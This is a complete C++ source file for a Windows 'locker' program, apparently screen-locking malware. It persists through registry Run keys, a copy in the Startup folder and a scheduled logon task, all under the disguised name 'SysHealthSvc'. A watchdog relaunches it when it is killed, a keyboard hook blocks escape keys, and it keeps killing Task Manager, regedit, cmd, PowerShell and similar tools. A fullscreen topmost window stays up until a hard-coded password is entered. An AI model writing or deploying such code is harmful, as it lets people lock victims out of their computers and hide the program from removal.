// locker.cpp — full gate, image from URL into RAM, multi-layer startup, watchdog
// build: cl /std:c++17 /EHsc /D_WIN32_WINNT=0x0601 /MT /O2 locker.cpp
//   user32.lib advapi32.lib gdi32.lib gdiplus.lib shell32.lib urlmon.lib
#define UNICODE
#define _UNICODE
#include <windows.h>
#include <gdiplus.h>
#include <urlmon.h>
#include <tlhelp32.h>
#include <string>
#include <cwchar>
#include <vector>

#pragma comment(lib, "urlmon.lib")

using namespace Gdiplus;

static const wchar_t* kPass   = L"netanyau";
static const wchar_t* kRunKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
static const wchar_t* kRunA   = L"SysHealthSvc";
static const wchar_t* kRunB   = L"SysHealthSvc2";
static const wchar_t* kImgUrl = L"https://i.ytimg.com/vi/umkBI1Qw_9k/maxresdefault.jpg";
static const wchar_t* kWdArg  = L"--wd";

static bool g_unlocked = false;
static std::wstring g_input;
static Image* g_bg = nullptr;
static ULONG_PTR g_gdip = 0;
static std::vector<BYTE> g_imgBuf;

static void fetchImageToRam() {
    IStream* stream = nullptr;
    if (FAILED(URLOpenBlockingStreamW(nullptr, kImgUrl, &stream, 0, nullptr))) return;
    STATSTG stat{};
    if (FAILED(stream->Stat(&stat, STATFLAG_NONAME))) { stream->Release(); return; }
    ULONG size = (ULONG)stat.cbSize.QuadPart;
    if (size == 0 || size > 32u * 1024u * 1024u) { stream->Release(); return; }
    g_imgBuf.resize(size);
    ULONG read = 0;
    stream->Read(g_imgBuf.data(), size, &read);
    stream->Release();
    g_imgBuf.resize(read);
}

static void decodeImageFromRam() {
    if (g_imgBuf.empty()) return;
    IStream* mem = nullptr;
    HGLOBAL hg = GlobalAlloc(GMEM_MOVEABLE, g_imgBuf.size());
    if (!hg) return;
    void* p = GlobalLock(hg);
    memcpy(p, g_imgBuf.data(), g_imgBuf.size());
    GlobalUnlock(hg);
    if (FAILED(CreateStreamOnHGlobal(hg, TRUE, &mem))) { GlobalFree(hg); return; }
    g_bg = Image::FromStream(mem);
    if (!g_bg || g_bg->GetLastStatus() != Ok) { delete g_bg; g_bg = nullptr; }
    mem->Release();
}

static std::wstring exePath() {
    wchar_t p[MAX_PATH]; GetModuleFileNameW(nullptr, p, MAX_PATH); return p;
}

static void writeRun(const wchar_t* name, const std::wstring& cmd) {
    HKEY hk;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, kRunKey, 0, nullptr, 0,
                        KEY_SET_VALUE, nullptr, &hk, nullptr) == ERROR_SUCCESS) {
        RegSetValueExW(hk, name, 0, REG_SZ,
                       reinterpret_cast<const BYTE*>(cmd.c_str()),
                       (DWORD)((cmd.size() + 1) * sizeof(wchar_t)));
        RegCloseKey(hk);
    }
}

static void installStartup() {
    std::wstring self = exePath();
    writeRun(kRunA, L"\"" + self + L"\"");
    writeRun(kRunB, L"\"" + self + L"\" " + kWdArg);
    wchar_t appdata[MAX_PATH]{};
    if (GetEnvironmentVariableW(L"APPDATA", appdata, MAX_PATH)) {
        std::wstring dir = std::wstring(appdata) +
            L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
        CopyFileW(self.c_str(), (dir + L"\\SysHealthSvc.exe").c_str(), FALSE);
    }
    wchar_t cmd[1024];
    swprintf_s(cmd, L"schtasks /create /f /sc onlogon /tn SysHealthSvc /tr \"\\\"%ls\\\"\"",
               self.c_str());
    STARTUPINFOW si{ sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi{};
    if (CreateProcessW(nullptr, cmd, nullptr, nullptr, FALSE,
                       CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }
}

static void removeStartup() {
    for (auto n : { kRunA, kRunB }) {
        HKEY hk;
        if (RegOpenKeyExW(HKEY_CURRENT_USER, kRunKey, 0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
            RegDeleteValueW(hk, n); RegCloseKey(hk);
        }
    }
    wchar_t appdata[MAX_PATH]{};
    if (GetEnvironmentVariableW(L"APPDATA", appdata, MAX_PATH)) {
        std::wstring p = std::wstring(appdata) +
            L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SysHealthSvc.exe";
        DeleteFileW(p.c_str());
    }
    wchar_t cmd[512] = L"schtasks /delete /f /tn SysHealthSvc";
    STARTUPINFOW si{ sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi{};
    if (CreateProcessW(nullptr, cmd, nullptr, nullptr, FALSE,
                       CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 3000);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }
}

static DWORD findPid(const wchar_t* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe{ sizeof(pe) }; DWORD pid = 0;
    if (Process32FirstW(snap, &pe)) {
        do { if (_wcsicmp(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; } }
        while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap); return pid;
}

static int runWatchdog() {
    for (;;) {
        DWORD pid = findPid(L"locker.exe");
        if (pid == 0) pid = findPid(L"SysHealthSvc.exe");
        if (pid == 0) {
            std::wstring cmd = L"\"" + exePath() + L"\"";
            STARTUPINFOW si{ sizeof(si) };
            si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
            PROCESS_INFORMATION pi{};
            CreateProcessW(nullptr, (LPWSTR)cmd.c_str(), nullptr, nullptr, FALSE,
                           CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
            if (pi.hProcess) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
        }
        Sleep(1500);
    }
    return 0;
}

static LRESULT CALLBACK LLKeyboard(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* kb = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        bool down = (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN);
        if (down) {
            switch (kb->vkCode) {
                case VK_ESCAPE: case VK_LWIN: case VK_RWIN:
                case VK_TAB:    case VK_MENU: case VK_F4:
                case VK_SNAPSHOT: case VK_APPS: case VK_CANCEL:
                case VK_F12:
                    return 1;
            }
        }
    }
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

static DWORD WINAPI GuardThread(LPVOID) {
    const wchar_t* targets[] = {
        L"taskmgr.exe", L"regedit.exe", L"cmd.exe",
        L"powershell.exe", L"procexp.exe", L"procexp64.exe",
        L"mmc.exe", L"msconfig.exe", L"tasklist.exe"
    };
    while (!g_unlocked) {
        for (auto t : targets) {
            HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (snap == INVALID_HANDLE_VALUE) continue;
            PROCESSENTRY32W pe{ sizeof(pe) };
            if (Process32FirstW(snap, &pe)) {
                do {
                    if (_wcsicmp(pe.szExeFile, t) == 0) {
                        HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                        if (h) { TerminateProcess(h, 0); CloseHandle(h); }
                    }
                } while (Process32NextW(snap, &pe));
            }
            CloseHandle(snap);
        }
        if (findPid(L"SysHealthSvc.exe") == 0 && findPid(L"locker.exe") == 0) {
            std::wstring cmd = L"\"" + exePath() + L"\" " + kWdArg;
            STARTUPINFOW si{ sizeof(si) };
            si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
            PROCESS_INFORMATION pi{};
            CreateProcessW(nullptr, (LPWSTR)cmd.c_str(), nullptr, nullptr, FALSE,
                           CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
            if (pi.hProcess) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
        }
        Sleep(600);
    }
    return 0;
}

static LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    switch (m) {
        case WM_CLOSE: case WM_DESTROY: return 0;
        case WM_NCHITTEST: return HTCAPTION;
        case WM_TIMER:
            SetWindowPos(h, HWND_TOPMOST, 0, 0, 0, 0,
                SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
            ShowWindow(h, SW_SHOW);
            return 0;
        case WM_CHAR: {
            wchar_t c = (wchar_t)w;
            if (c == VK_BACK) { if (!g_input.empty()) g_input.pop_back(); }
            else if (c == VK_RETURN) {
                if (g_input == kPass) {
                    g_unlocked = true; removeStartup(); PostQuitMessage(0);
                } else g_input.clear();
            } else if (c >= 32) g_input.push_back(c);
            InvalidateRect(h, nullptr, TRUE);
            return 0;
        }
        case WM_PAINT: {
            PAINTSTRUCT ps; HDC dc = BeginPaint(h, &ps);
            RECT r; GetClientRect(h, &r);
            if (g_bg) {
                Graphics g(dc);
                g.SetInterpolationMode(InterpolationModeHighQualityBicubic);
                g.DrawImage(g_bg, 0, 0, r.right, r.bottom);
            } else FillRect(dc, &r, (HBRUSH)GetStockObject(BLACK_BRUSH));

            HDC mem = CreateCompatibleDC(dc);
            HBITMAP bmp = CreateCompatibleBitmap(dc, r.right, r.bottom);
            SelectObject(mem, bmp);
            HBRUSH dim = CreateSolidBrush(RGB(0, 0, 0));
            FillRect(mem, &r, dim);
            BLENDFUNCTION bf{ AC_SRC_OVER, 0, 140, 0 };
            AlphaBlend(dc, 0, 0, r.right, r.bottom, mem, 0, 0, r.right, r.bottom, bf);
            DeleteObject(bmp); DeleteDC(mem); DeleteObject(dim);

            SetBkMode(dc, TRANSPARENT);
            HFONT big = CreateFontW(72, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Segoe UI");
            SelectObject(dc, big);
            SetTextColor(dc, RGB(0, 255, 120));
            const wchar_t* line1 = L"LOCKED";
            const wchar_t* line2 = L"enter password:";
            std::wstring stars(g_input.size(), L'*');
            DrawTextW(dc, line1, -1, &r, DT_CENTER | DT_TOP | DT_SINGLELINE | DT_NOPREFIX);
            RECT r2 = r; r2.top += 130;
            HFONT mid = CreateFontW(30, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Consolas");
            SelectObject(dc, mid);
            DrawTextW(dc, line2, -1, &r2, DT_CENTER | DT_TOP | DT_SINGLELINE | DT_NOPREFIX);
            RECT r3 = r; r3.top += 180;
            SetTextColor(dc, RGB(255, 255, 255));
            DrawTextW(dc, stars.c_str(), (int)stars.size(), &r3,
                DT_CENTER | DT_TOP | DT_SINGLELINE | DT_NOPREFIX);
            DeleteObject(big); DeleteObject(mid);
            EndPaint(h, &ps);
            return 0;
        }
    }
    return DefWindowProcW(h, m, w, l);
}

int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR cmdLine, int) {
    if (cmdLine && wcsstr(cmdLine, kWdArg)) return runWatchdog();

    installStartup();
    GdiplusStartupInput si; GdiplusStartup(&g_gdip, &si, nullptr);
    fetchImageToRam();
    decodeImageFromRam();
    CreateThread(nullptr, 0, GuardThread, nullptr, 0, nullptr);

    WNDCLASSW wc{};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInst;
    wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.lpszClassName = L"BenchWall";
    RegisterClassW(&wc);

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    HWND hwnd = CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"BenchWall", L"system locked", WS_POPUP | WS_VISIBLE,
        0, 0, sw, sh, nullptr, nullptr, hInst, nullptr);
    if (!hwnd) return 1;

    HHOOK kh = SetWindowsHookExW(WH_KEYBOARD_LL, LLKeyboard, hInst, 0);
    SetTimer(hwnd, 1, 200, nullptr);
    SetForegroundWindow(hwnd); SetFocus(hwnd);

    MSG msg;
    while (!g_unlocked && GetMessageW(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg); DispatchMessageW(&msg);
    }
    if (kh) UnhookWindowsHookEx(kh);
    delete g_bg;
    GdiplusShutdown(g_gdip);
    return 0;
}